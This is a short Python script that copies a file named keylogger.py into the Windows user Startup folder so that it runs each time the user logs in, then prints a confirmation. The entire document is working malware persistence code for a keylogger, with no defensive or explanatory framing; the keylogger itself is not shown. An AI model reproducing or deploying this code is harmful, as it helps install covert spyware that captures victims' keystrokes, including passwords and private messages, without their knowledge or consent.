import os
import shutil

filename = "keylogger.py"
target = os.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"

shutil.copy(filename, target)
print("Keylogger set to run on startup.")
